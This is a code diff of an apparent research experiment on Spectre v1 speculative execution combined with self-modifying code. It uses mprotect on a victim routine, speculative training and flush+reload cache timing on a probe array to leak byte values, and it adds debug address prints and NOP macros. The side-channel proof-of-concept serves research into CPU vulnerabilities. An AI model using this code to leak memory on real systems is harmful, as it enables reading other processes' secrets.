@@ -145,6 +145,8 @@ long long int findMode(long long int arr[], int length) {
 
 
 extern uint8_t vic(uint8_t cond, uint64_t val);
+extern void* safe;
+extern void* target;
 extern char probe_array[256 * 4096];
 
 
@@ -166,8 +168,7 @@ void victim_function(int x){
 
 long long int pmc[5][1003];
 
-void spectre_v1_smc(){
-
+void trigger(){
     mprotect(vic, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
 
     // load to avoid page fault
@@ -191,31 +192,22 @@ void spectre_v1_smc(){
         // uint64_t instr1 = 0x4800000061c0c748;
         uint64_t instr1 = 0x9090;
         uint64_t instr2 = 0x9090;
-        for(int k = 0; k < 500; ++k)
-            vic(0, instr1);
-        // vic(0, instr1);
-        // vic(0, instr1);
-        // vic(0, instr1);
-        // vic(0, instr1);
-        // victim_function(0x61);
-        // victim_function(0x61);
-        // victim_function(0x61);
-        // victim_function(0x61);
-       
-        // vic(1, 0xc39d);
         
         mfence();
+
+        // vic(0, instr2);
+
         flush(&probe_array[0x61 * 4096]);
         flush(&probe_array[0x62 * 4096]);
-        mfence();
-        read_all_pmc(pmc00, pmc01, pmc02, pmc03);
+        // mfence();
+        // read_all_pmc(pmc00, pmc01, pmc02, pmc03);
         mfence();
         // victim_function(0x62);
-        uint8_t a = vic(1, instr2);
+        uint8_t a = vic(0, instr2);
 
         mfence();
-        read_all_pmc(pmc10, pmc11, pmc12, pmc13);
-        mfence();
+        // read_all_pmc(pmc10, pmc11, pmc12, pmc13);
+        // mfence();
 
         
 
@@ -226,23 +218,23 @@ void spectre_v1_smc(){
             uint64_t t1 = rdtsc();
             maccess(&probe_array[mix_i * 4096]);
             uint64_t t2 = rdtsc() - t1;
-            if (t2 < CACHE_MISS) {
+            if (t2 < CACHE_MISS && mix_i != 0) {
                 results[mix_i]++;
             }
         }
 
-        pmc[0][try] =(long int) pmc10 - pmc00;
-        pmc[1][try] = (long int) pmc11 - pmc01;
-        pmc[2][try] = (long int) pmc12 - pmc02;
-        pmc[3][try] =(long int)  pmc13 - pmc03;
+        // pmc[0][try] =(long int) pmc10 - pmc00;
+        // pmc[1][try] = (long int) pmc11 - pmc01;
+        // pmc[2][try] = (long int) pmc12 - pmc02;
+        // pmc[3][try] =(long int)  pmc13 - pmc03;
     }
 
     //find modes of pmc
-    long long int modes[4] = {0};
-    for(int i = 0; i < 4; ++i){
-        modes[i] = findMode(pmc[i], 1000);
-        printf("pmc %d: %lld\n", i, modes[i]);
-    }
+    // long long int modes[4] = {0};
+    // for(int i = 0; i < 4; ++i){
+    //     modes[i] = findMode(pmc[i], 1000);
+    //     printf("pmc %d: %lld\n", i, modes[i]);
+    // }
 
     // find top 2 max
     int j = -1,  k = -1;
@@ -257,96 +249,60 @@ void spectre_v1_smc(){
     }
 
     printf("idx: %2x score: %d, second_idx:%2x, second score: %d\n", j, results[j], k, results[k]);
-
-    // for(int i = 0; i < 100; ++i)
-    //     printf("%d\n", ((i / 6) & 1) - 1);
-
-
-    // asm volatile(".global check\n\
-    //     check:\n\
-    //     nop     \n\
-    //     ");
-    // int a = idx == 98;
-    // printf("%d\n", a);
+    printf("%d, %d\n", results[10], results[20]);
 
 }
 
-extern void train_branch(int cond, uint16_t rcx);
+#include "../ck/predefined.h"
 
-void spectre_v1_arguments(){
+#define __stringify(x) #x
 
-    mprotect(train_branch, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
+#define REPEAT_ASM(num)    \
+    asm volatile(                       \
+        ".rep " __stringify(num) "\n\t"            \
+        "nop\n\t"               \
+        ".endr"                          \
+        :                                \
+        :                                \
+        : );
 
-    for(int i = 0; i < 256*4096; ++i)
-        probe_array[i] = 1;
+#define REPEAT_builtin(num, X)                \
+    do {                               \
+        int i;                         \
+        if (__builtin_constant_p(num)) \
+            for (i = 0; i < num; i++)  \
+                { X; }                 \
+    } while (0)
 
-    int cond = 1;
-    int ncond = 0;
-    int rcx = 0x9090;
-    int nrcx = 0x9090;
+#define REPEAT_NUM(num,x) REPEAT_##num(x)
 
-    int results[256] = {0};
-    for(int try = 0; try < 1000; ++try){
-        for (size_t i = 0; i < 256; i++) {
-            size_t mix_i = ((i * 167) + 13) & 255;
-            flush(&probe_array[mix_i * 4096]);
-        }
-
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-        train_branch(cond, rcx);
-
-        maccess(&probe_array[0x30 * 4096]);
-        maccess(&probe_array[0x30 * 4096]);
-        maccess(&probe_array[0x30 * 4096]);
-        maccess(&probe_array[0x30 * 4096]);
-        maccess(&probe_array[0x30 * 4096]);
-        maccess(&probe_array[0x30 * 4096]);
-        mfence();
-
-        flush(&probe_array[0x30 * 4096]);
-        flush(&probe_array[0xf3 * 4096]);
-
-        mfence();
-
-        train_branch(ncond, nrcx);
-
-        for (size_t i = 0; i < 256; i++) {
-            size_t mix_i = ((i * 167) + 13) & 255;
-            uint64_t t1 = rdtsc();
-            maccess(&probe_array[mix_i * 4096]);
-            uint64_t t2 = rdtsc() - t1;
-            if (t2 < CACHE_MISS) {
-                results[mix_i]++;
-            }
-        }
-
-    }
-
-    // find top 2 max
-    int j = -1,  k = -1;
-    for(int i = 0; i < 256; ++i){
-        if(j < 0 || results[i] >= results[j]){
-            k = j;
-            j = i;
-        }
-        else if (k < 0 || results[i] >= results[k]){
-            k = i;
-        }
-    }
-
-    printf("idx: %2x score: %d, second_idx:%2x, second score: %d\n", j, results[j], k, results[k]);
-}
 
 int main(){
-    spectre_v1_arguments();
-    spectre_v1_smc();
+    // spectre_v1_arguments();
+    // spectre_v1_smc();
+
+    // print address of vic, safe, target
+    // printf("vic: %p\n", vic);
+    printf("pc: %p\n", (uint16_t *)&safe - 1);
+    printf("bin: 0x%2x%2x\n", *((uint8_t*)&safe-2), *((uint8_t*)&safe-1));
+    printf("target: %p\n", &target);
     
+    trigger();
+
+    int num = 10;
+    asm volatile(".global debug\n\
+                debug:");
+    
+    // 使用rep指令重复num次
+    // REPEAT_ASM(10);
+    // REPEAT_10("nop");
+    REPEAT_NUM(10, "nop");
+    // REPEAT_builtin(10, asm volatile("nop"););
+    // asm volatile(".rep 10\n\
+    //                 nop\n\
+    //                 .endr");
+
+    printf("debug\n");
+
+    return 0;
 }
